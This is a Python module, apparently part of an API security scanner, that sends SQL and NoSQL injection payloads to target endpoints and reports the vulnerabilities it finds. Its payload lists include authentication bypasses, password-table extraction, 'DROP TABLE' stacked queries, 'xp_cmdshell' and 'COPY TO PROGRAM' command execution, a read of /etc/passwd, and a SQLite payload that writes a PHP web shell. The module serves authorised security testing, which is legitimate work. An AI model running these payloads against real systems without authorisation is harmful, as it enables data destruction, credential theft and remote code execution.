"""
SQL Injection attack module.

Tests API endpoints for SQL injection vulnerabilities by sending malicious payloads
in parameters and request bodies.

v1.0.0 Enhancements:
- Time-based blind SQL injection detection
- Error-based SQL injection detection
- UNION-based SQL injection with column detection
- Database fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- Boolean-based blind SQL injection
- Stacked queries detection
- crAPI/OWASP benchmark coverage
"""

import time
import re
from typing import Any, Optional
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Parameter,
    Severity,
    Vulnerability,
    SQLInjectionResult
)


class SQLInjectionAttacker:
    """Performs SQL injection attacks on API endpoints.
    
    Supports multiple SQL injection techniques:
    - Error-based injection
    - Time-based blind injection
    - UNION-based injection
    - Boolean-based blind injection
    - Stacked queries
    """
    
    # SQL injection payloads organized by database type and technique
    PAYLOADS = {
        # Generic payloads that work on multiple databases
        "generic": [
            # Basic authentication bypass
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "' OR '1'='1'{}",
            "1' OR '1'='1",
            "1 OR 1=1",
            "' OR ''='",
            "'' OR ''=''",
            # Comment-based bypasses
            "admin'--",
            "admin'#",
            "admin'/*",
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND '1'='1",
            "' AND '1'='2",
        ],
        
        # MySQL specific payloads
        "mysql": [
            # Time-based blind
            "' AND SLEEP(5)--",
            "' AND SLEEP(5) #",
            "'; SELECT SLEEP(5)--",
            "1 AND SLEEP(5)",
            "1) AND SLEEP(5)--",
            "' OR BENCHMARK(5000000,SHA1('test'))--",
            # Error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # UNION-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password,3 FROM users--",
            "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacked','hacked')--",
            # Version detection
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
        ],
        
        # PostgreSQL specific payloads
        "postgresql": [
            # Time-based blind
            "'; SELECT pg_sleep(5)--",
            "' AND pg_sleep(5)--",
            "1; SELECT pg_sleep(5)--",
            "' OR (SELECT pg_sleep(5))--",
            # Error-based
            "' AND 1=CAST((SELECT version()) AS INT)--",
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
            # UNION-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT version(),NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            # Stacked queries
            "'; CREATE TABLE pwned(data text);--",
            "'; COPY pwned FROM '/etc/passwd';--",
            # System commands (if superuser)
            "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';--",
        ],
        
        # MSSQL specific payloads
        "mssql": [
            # Time-based blind
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
            "1; WAITFOR DELAY '0:0:5'--",
            # Error-based
            "' AND 1=CONVERT(INT,@@version)--",
            "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            # UNION-based
            "' UNION SELECT NULL--",
            "' UNION SELECT @@version,NULL--",
            "' UNION SELECT name,master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins--",
            # Stacked queries
            "'; EXEC xp_cmdshell('id')--",
            "'; EXEC master..xp_cmdshell('dir')--",
            # Database info
            "' UNION SELECT name,NULL FROM master..sysdatabases--",
        ],
        
        # Oracle specific payloads
        "oracle": [
            # Time-based
            "' AND DBMS_LOCK.SLEEP(5)=1--",
            "' UNION SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--",
            # Error-based
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
            # UNION-based
            "' UNION SELECT NULL FROM dual--",
            "' UNION SELECT NULL,NULL FROM dual--",
            "' UNION SELECT banner,NULL FROM v$version--",
            "' UNION SELECT table_name,NULL FROM all_tables--",
            # Data extraction
            "' UNION SELECT username,password FROM all_users--",
        ],
        
        # SQLite specific payloads
        "sqlite": [
            # Time-based (not directly supported, but can use heavy queries)
            "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
            # Error-based
            "' AND 1=CAST((SELECT sql FROM sqlite_master) AS INT)--",
            # UNION-based
            "' UNION SELECT NULL--",
            "' UNION SELECT sqlite_version(),NULL--",
            "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT sql,NULL FROM sqlite_master--",
            # File access
            "; ATTACH DATABASE '/var/www/html/shell.php' AS pwned;CREATE TABLE pwned.pwned (data text);INSERT INTO pwned.pwned VALUES('<?php system($_GET['cmd']);?>');--",
        ],
        
        # NoSQL injection (MongoDB)
        "nosql": [
            # Basic operators
            '{"$gt": ""}',
            '{"$gt": null}',
            '{"$ne": ""}',
            '{"$ne": null}',
            '{"$gt": ""}',
            # Authentication bypass
            '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            '{"username": "admin", "password": {"$gt": ""}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            # JavaScript injection
            '{"$where": "1==1"}',
            '{"$where": "this.password.match(/.*/)"}',
            '{"$where": "this.username == \\"admin\\" && this.password.match(/.*/)"}',
            # Regex
            '{"username": {"$regex": ".*"}}',
            '{"password": {"$regex": "^a"}}',
        ],
        
        # Time-based payloads for blind injection detection
        "time_based": [
            # MySQL
            "' AND SLEEP(5)--",
            "' AND SLEEP(5) #",
            "1' AND SLEEP(5) AND '1'='1",
            "1') AND SLEEP(5) AND ('1'='1",
            # PostgreSQL  
            "'; SELECT pg_sleep(5)--",
            "' AND pg_sleep(5)--",
            "1' AND pg_sleep(5) AND '1'='1",
            # MSSQL
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
            "1' WAITFOR DELAY '0:0:5'--",
            # Oracle
            "' AND DBMS_LOCK.SLEEP(5)=1--",
            "' UNION SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--",
            # Generic
            "1'; SELECT SLEEP(5);--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
        
        # Boolean-based blind injection
        "boolean_based": [
            # True conditions
            "' AND 1=1--",
            "' AND '1'='1",
            "' AND 'a'='a",
            "1 AND 1=1",
            "1 OR 1=1",
            # False conditions
            "' AND 1=2--",
            "' AND '1'='2",
            "' AND 'a'='b",
            "1 AND 1=2",
        ],
        
        # crAPI specific payloads
        "crapi_specific": [
            "' OR 1=1--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "admin'--",
            "' OR ''='",
        ],
    }
    
    # SQL error patterns for different databases
    ERROR_PATTERNS = {
        "mysql": [
            "sql syntax.*mysql",
            "warning.*mysql",
            "mysql_fetch",
            "valid mysql result",
            "mysql_numrows",
            "mysql_fetch_array",
            "mysql_fetch_assoc",
            "mysqli_",
            "mysql_query",
            "unknown column",
            "where clause",
            "mysqld",
        ],
        "postgresql": [
            "pg_",
            "pg_query",
            "postgresql",
            "pg_connect",
            "pg_exec",
            "pg_pconnect",
            "pg_fetch",
            "pg_fetch_array",
            "pg_fetch_row",
            "pg_num_rows",
            "pg_errormessage",
            "pg_last_error",
            "pg_result_error",
            "SQLSTATE[",
            "psycopg2",
        ],
        "mssql": [
            "microsoft odbc",
            "mssql",
            "sql server",
            "microsoft sql",
            "sqlserver",
            "odbc sql server driver",
            "unclosed quotation mark",
            "quoted string not properly terminated",
        ],
        "oracle": [
            "ora-",
            "oracle",
            "oracle jdbc",
            "oracle error",
            "oracle driver",
            "pl/sql",
            "pls-",
        ],
        "sqlite": [
            "sqlite",
            "sqlite3",
            "sqlite_",
            "sqliteerror",
            "not an error",
            "no such table",
            "no such column",
            "sqlite_master",
        ],
        "generic": [
            "sql syntax",
            "syntax error",
            "unrecognized token",
            "unexpected token",
            "near \"",
            "division by zero",
            "data truncated",
            "integer overflow",
            "constraint failed",
        ],
    }
    
    # Success indicators (data returned when shouldn't be)
    SUCCESS_PATTERNS = [
        "admin",
        "root",
        "password",
        "passwd",
        "pwd",
        "email",
        "token",
        "secret",
        "private",
        "credit_card",
        "ssn",
        "social_security",
        "user_data",
        "credentials",
    ]
    
    def __init__(self, target_url: str, timeout: int = 10):
        """Initialize the SQL injection attacker.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/1.0.0 SQL Injection Scanner',
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        
        # Store baseline responses for comparison
        self.baseline_responses: dict[str, dict] = {}
    
    def attack(
        self, 
        endpoint: Endpoint, 
        parameters_to_test: Optional[list[str]] = None,
        auth_token: Optional[str] = None
    ) -> list[AttackResult]:
        """Perform SQL injection attacks on an endpoint.
        
        Args:
            endpoint: The endpoint to attack
            parameters_to_test: Specific parameter names to test (optional)
            auth_token: Authentication token (optional)
            
        Returns:
            List of attack results
        """
        results: list[AttackResult] = []
        
        # Handle API misuse (list passed as auth_token)
        if auth_token is not None and isinstance(auth_token, list):
            parameters_to_test = auth_token
            auth_token = None
        
        if auth_token:
            self.session.headers['Authorization'] = f"Bearer {auth_token}"
        
        # Determine which parameters to test
        params_to_test = self._get_testable_parameters(endpoint, parameters_to_test)
        
        if not params_to_test:
            return results
        
        # Establish baseline for each parameter
        self._establish_baselines(endpoint, params_to_test)
        
        # Test each parameter
        for param in params_to_test:
            # Phase 1: Quick error-based tests
            for payload in self.PAYLOADS["generic"][:5]:
                result = self._test_payload(endpoint, param, payload, "error_based")
                results.append(result)
                
                if result.success:
                    # Found vulnerability, do deeper testing
                    for db_type in ["mysql", "postgresql", "mssql", "sqlite"]:
                        for db_payload in self.PAYLOADS.get(db_type, [])[:3]:
                            results.append(self._test_payload(endpoint, param, db_payload, db_type))
                    break
            
            # Phase 2: Time-based blind tests (important for blind SQLi)
            for payload in self.PAYLOADS["time_based"][:4]:
                result = self._test_time_based(endpoint, param, payload)
                results.append(result)
                
                if result.success:
                    break
            
            # Phase 3: Boolean-based blind tests
            bool_results = self._test_boolean_based(endpoint, param)
            results.extend(bool_results)
            
            # Phase 4: UNION-based tests (column counting)
            union_results = self._test_union_based(endpoint, param)
            results.extend(union_results)
        
        return results
    
    def _get_testable_parameters(
        self, 
        endpoint: Endpoint, 
        parameters_to_test: Optional[list[str]]
    ) -> list[Parameter]:
        """Get list of parameters that should be tested."""
        params = []
        
        # Parameter types that are commonly vulnerable
        vulnerable_types = ['id', 'user', 'name', 'search', 'query', 'filter', 
                          'sort', 'order', 'key', 'value', 'email', 'username',
                          'password', 'token', 'code', 'ref', 'page', 'limit']
        
        for param in endpoint.parameters:
            # Skip if specific parameters requested and this isn't one
            if parameters_to_test and param.name not in parameters_to_test:
                continue
            
            # Test query params, path params, and body params
            if param.location in ('query', 'path', 'body'):
                params.append(param)
            # Also test parameters with vulnerable-sounding names
            elif any(vuln in param.name.lower() for vuln in vulnerable_types):
                params.append(param)
        
        # Check for request body parameters
        if endpoint.request_body:
            body_params = self._extract_body_parameters(endpoint.request_body)
            for param_name in body_params:
                if not any(p.name == param_name for p in params):
                    params.append(Parameter(
                        name=param_name,
                        location='body',
                        param_type='string'
                    ))
        
        return params
    
    def _extract_body_parameters(self, request_body: dict) -> list[str]:
        """Extract parameter names from request body schema."""
        params = []
        
        content = request_body.get('content', {})
        for content_type, content_schema in content.items():
            if 'application/json' in content_type:
                schema = content_schema.get('schema', {})
                properties = schema.get('properties', {})
                params.extend(properties.keys())
        
        return params
    
    def _establish_baselines(self, endpoint: Endpoint, params: list[Parameter]):
        """Establish baseline responses for comparison."""
        for param in params:
            try:
                url = f"{self.target_url}{endpoint.path}"
                
                # Make normal request with benign value
                if endpoint.method.value == 'GET':
                    response = self.session.get(
                        url, 
                        params={param.name: '1'}, 
                        timeout=self.timeout
                    )
                else:
                    response = self.session.request(
                        endpoint.method.value,
                        url,
                        json={param.name: '1'},
                        timeout=self.timeout
                    )
                
                self.baseline_responses[param.name] = {
                    'status': response.status_code,
                    'length': len(response.text),
                    'text': response.text.lower()[:500],
                    'time': 0.5  # Default baseline time
                }
            except Exception:
                self.baseline_responses[param.name] = {
                    'status': 200,
                    'length': 0,
                    'text': '',
                    'time': 0.5
                }
    
    def _test_payload(
        self, 
        endpoint: Endpoint, 
        param: Parameter, 
        payload: str,
        technique: str
    ) -> AttackResult:
        """Test a single SQL injection payload."""
        start_time = time.time()
        
        try:
            url = f"{self.target_url}{endpoint.path}"
            
            # Build request based on method and parameter location
            params = {}
            json_body = {}
            headers = {}
            
            # Add other required parameters
            for p in endpoint.parameters:
                if p.name == param.name:
                    continue
                default = self._get_default_value(p)
                if p.location == 'query':
                    params[p.name] = default
                elif p.location == 'body':
                    json_body[p.name] = default
                elif p.location == 'header':
                    headers[p.name] = str(default)
            
            # Inject the payload
            if param.location == 'query':
                params[param.name] = payload
            elif param.location == 'body':
                json_body[param.name] = payload
            elif param.location == 'path':
                # Replace path parameter
                from urllib.parse import quote
                url = url.replace(f"{{{param.name}}}", quote(payload, safe=''))
            
            # Make request
            if endpoint.method.value == 'GET':
                response = self.session.get(
                    url, 
                    params=params,
                    headers=headers if headers else None,
                    timeout=self.timeout
                )
            else:
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    params=params if params else None,
                    json=json_body if json_body else None,
                    headers=headers if headers else None,
                    timeout=self.timeout
                )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check for vulnerability indicators
            is_vulnerable, db_type, evidence = self._check_vulnerability(
                response, payload, param.name, technique
            )
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=is_vulnerable,
                payload=payload,
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms,
                extra_data={
                    'technique': technique,
                    'db_type': db_type,
                    'evidence': evidence,
                    'param_name': param.name
                } if is_vulnerable else None
            )
            
        except requests.exceptions.Timeout:
            duration_ms = (time.time() - start_time) * 1000
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=False,
                payload=payload,
                error_message="Request timed out",
                duration_ms=duration_ms
            )
        except Exception as e:
            duration_ms = (time.time() - start_time) * 1000
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=False,
                payload=payload,
                error_message=str(e)[:200],
                duration_ms=duration_ms
            )
    
    def _test_time_based(
        self, 
        endpoint: Endpoint, 
        param: Parameter, 
        payload: str
    ) -> AttackResult:
        """Test for time-based blind SQL injection."""
        start_time = time.time()
        
        try:
            url = f"{self.target_url}{endpoint.path}"
            
            # Build request
            params = {}
            json_body = {}
            
            for p in endpoint.parameters:
                if p.name == param.name:
                    continue
                default = self._get_default_value(p)
                if p.location == 'query':
                    params[p.name] = default
                elif p.location == 'body':
                    json_body[p.name] = default
            
            if param.location == 'query':
                params[param.name] = payload
            elif param.location == 'body':
                json_body[param.name] = payload
            
            # Use a longer timeout for time-based tests
            request_timeout = max(self.timeout, 10)
            
            if endpoint.method.value == 'GET':
                response = self.session.get(
                    url, params=params, timeout=request_timeout
                )
            else:
                response = self.session.request(
                    endpoint.method.value,
                    url, json=json_body if json_body else None,
                    params=params if params else None,
                    timeout=request_timeout
                )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Time-based detection: if response took > 5 seconds, likely vulnerable
            # (This works because payloads use SLEEP(5) or similar)
            is_vulnerable = duration_ms > 4500  # 4.5 seconds threshold
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=is_vulnerable,
                payload=payload,
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms,
                extra_data={
                    'technique': 'time_based_blind',
                    'response_time_ms': duration_ms,
                    'threshold_ms': 4500,
                    'param_name': param.name
                } if is_vulnerable else None
            )
            
        except requests.exceptions.Timeout:
            duration_ms = (time.time() - start_time) * 1000
            # Timeout might indicate successful time-based injection
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=True,  # Timeout could mean sleep executed
                payload=payload,
                error_message="Request timed out (potential time-based SQLi)",
                duration_ms=duration_ms,
                extra_data={
                    'technique': 'time_based_timeout',
                    'param_name': param.name
                }
            )
        except Exception as e:
            duration_ms = (time.time() - start_time) * 1000
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=False,
                payload=payload,
                error_message=str(e)[:200],
                duration_ms=duration_ms
            )
    
    def _test_boolean_based(
        self, 
        endpoint: Endpoint, 
        param: Parameter
    ) -> list[AttackResult]:
        """Test for boolean-based blind SQL injection."""
        results = []
        
        # Test true condition
        true_payload = "' AND 1=1--"
        true_result = self._test_payload(endpoint, param, true_payload, "boolean_true")
        results.append(true_result)
        
        # Test false condition
        false_payload = "' AND 1=2--"
        false_result = self._test_payload(endpoint, param, false_payload, "boolean_false")
        results.append(false_result)
        
        # Compare responses
        if (true_result.response_status == false_result.response_status and
            true_result.response_body and false_result.response_body and
            len(true_result.response_body) != len(false_result.response_body)):
            # Different response sizes suggest boolean-based injection
            true_result.success = True
            true_result.extra_data = {
                'technique': 'boolean_based_blind',
                'evidence': f"Response size differs: true={len(true_result.response_body)}, false={len(false_result.response_body)}",
                'param_name': param.name
            }
        
        return results
    
    def _test_union_based(
        self, 
        endpoint: Endpoint, 
        param: Parameter
    ) -> list[AttackResult]:
        """Test for UNION-based SQL injection with column detection."""
        results = []
        
        # Test UNION with increasing column counts
        for num_columns in range(1, 11):
            # Build UNION payload with NULL columns
            nulls = ','.join(['NULL'] * num_columns)
            payload = f"' UNION SELECT {nulls}--"
            
            result = self._test_payload(endpoint, param, payload, f"union_{num_columns}_columns")
            results.append(result)
            
            # If we don't get an error with this number of columns, we found the right count
            if result.response_status == 200 and result.response_body:
                if 'error' not in result.response_body.lower():
                    result.success = True
                    result.extra_data = {
                        'technique': 'union_based',
                        'num_columns': num_columns,
                        'evidence': f"UNION with {num_columns} columns succeeded",
                        'param_name': param.name
                    }
                    break
        
        return results
    
    def _get_default_value(self, param: Parameter) -> Any:
        """Get a default value for a parameter."""
        if param.example:
            return param.example
        
        defaults = {
            'string': 'test',
            'integer': 1,
            'number': 1.0,
            'boolean': True,
            'array': [],
            'object': {}
        }
        return defaults.get(param.param_type, 'test')
    
    def _check_vulnerability(
        self, 
        response: requests.Response, 
        payload: str,
        param_name: str,
        technique: str
    ) -> tuple[bool, str, str]:
        """Check if response indicates SQL injection vulnerability.
        
        Returns:
            Tuple of (is_vulnerable, database_type, evidence)
        """
        response_text = response.text.lower()
        
        # Check for database-specific error patterns
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern.lower() in response_text:
                    return True, db_type, f"Database error pattern found: {pattern}"
        
        # Check for successful status with error content
        if response.status_code == 200:
            # Check for SQL keywords in response (unusual)
            sql_keywords = ['select', 'insert', 'update', 'delete', 'drop', 'union', 'where']
            keyword_count = sum(1 for kw in sql_keywords if f' {kw} ' in response_text)
            
            if keyword_count >= 2:
                return True, 'unknown', "Multiple SQL keywords found in response"
            
            # Check for sensitive data patterns
            try:
                if response.headers.get('content-type', '').startswith('application/json'):
                    data = response.json()
                    data_str = str(data).lower()
                    
                    for pattern in self.SUCCESS_PATTERNS:
                        if pattern in data_str and 'error' not in data_str:
                            return True, 'unknown', f"Sensitive data pattern found: {pattern}"
                    
                    # Check for unusually large result sets
                    if isinstance(data, list) and len(data) > 100:
                        return True, 'unknown', f"Large result set returned: {len(data)} rows"
                        
            except (ValueError, KeyError):
                pass
        
        # Check for different response than baseline
        baseline = self.baseline_responses.get(param_name, {})
        if baseline:
            baseline_text = baseline.get('text', '')
            
            # If response is significantly different, might indicate injection
            if (response_text and baseline_text and 
                len(response_text) > 0 and 
                abs(len(response_text) - len(baseline_text)) > 100):
                
                # Check if difference is due to data vs error
                if 'error' not in response_text and 'error' in baseline_text:
                    return True, 'unknown', "Response changed from error to success"
        
        # Check for 5xx errors that might reveal SQL issues
        if response.status_code >= 500:
            if any(p in response_text for p in ['sql', 'query', 'syntax', 'database']):
                return True, 'unknown', "Server error with SQL-related content"
        
        return False, '', ''
    
    def create_vulnerability(
        self, 
        result: AttackResult, 
        endpoint: Endpoint
    ) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        technique = 'error_based'
        db_type = 'unknown'
        evidence = ''
        param_name = ''
        
        if result.extra_data:
            technique = result.extra_data.get('technique', 'error_based')
            db_type = result.extra_data.get('db_type', 'unknown')
            evidence = result.extra_data.get('evidence', '')
            param_name = result.extra_data.get('param_name', '')
        
        # Determine severity based on technique
        severity = Severity.HIGH
        if technique == 'time_based_blind':
            severity = Severity.HIGH  # Blind SQLi is still very serious
        elif 'union' in technique:
            severity = Severity.CRITICAL  # Can extract all data
        
        # Build description
        description = f"SQL injection vulnerability detected in parameter '{param_name}'. "
        
        if technique == 'time_based_blind':
            description += (
                f"Time-based blind SQL injection confirmed. The application is vulnerable "
                f"to SQL injection that can be exploited using time-based techniques to extract "
                f"data even when error messages are suppressed. Response delay detected: "
                f"{result.extra_data.get('response_time_ms', 0):.0f}ms."
            )
        elif technique == 'boolean_based_blind':
            description += (
                f"Boolean-based blind SQL injection confirmed. The application returns "
                f"different responses based on injected boolean conditions, allowing "
                f"data extraction through inference."
            )
        elif 'union' in technique:
            description += (
                f"UNION-based SQL injection confirmed. The application allows extracting "
                f"arbitrary data from the database using UNION SELECT statements. "
                f"Column count determined: {result.extra_data.get('num_columns', 'unknown')}."
            )
        else:
            description += (
                f"Error-based SQL injection confirmed ({db_type} detected). "
                f"The application returns database error messages that can be used to "
                f"extract sensitive information. Evidence: {evidence}"
            )
        
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.SQL_INJECTION,
            severity=severity,
            title=f"SQL Injection in {endpoint.full_path}",
            description=description,
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Parameter: {param_name}\n"
                f"Payload: {result.payload}\n"
                f"Technique: {technique}\n"
                f"Database Type: {db_type}\n"
                f"Evidence: {evidence}\n"
                f"Response Status: {result.response_status}\n"
                f"Response Preview: {result.response_body[:200] if result.response_body else 'N/A'}..."
            ),
            recommendation=(
                "1. Use Parameterized Queries/Prepared Statements:\n"
                "   - Python: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n"
                "   - Java: PreparedStatement stmt = conn.prepareStatement('SELECT * FROM users WHERE id = ?')\n"
                "   - PHP: $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id')\n"
                "\n"
                "2. Input Validation:\n"
                "   - Whitelist allowed characters\n"
                "   - Validate data types (integers should be integers)\n"
                "   - Limit input length\n"
                "\n"
                "3. Use ORM Libraries:\n"
                "   - SQLAlchemy, Django ORM, Hibernate automatically escape inputs\n"
                "\n"
                "4. Least Privilege Database Access:\n"
                "   - Application database user should not have DROP, CREATE privileges\n"
                "   - Separate read-only and read-write connections\n"
                "\n"
                "5. Web Application Firewall (WAF):\n"
                "   - Implement SQL injection detection rules\n"
                "   - Block common injection patterns\n"
                "\n"
                "6. Error Handling:\n"
                "   - Never expose database errors to users\n"
                "   - Use generic error messages\n"
                "   - Log detailed errors server-side only"
            ),
            cwe_id="CWE-89",
            owasp_category="A03:2021 - Injection",
            response_evidence=result.response_body,
            cvss_score=9.8 if severity == Severity.CRITICAL else 8.6,
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://portswigger.net/web-security/sql-injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                "https://github.com/payloadbox/sql-injection-payload-list"
            ]
        )
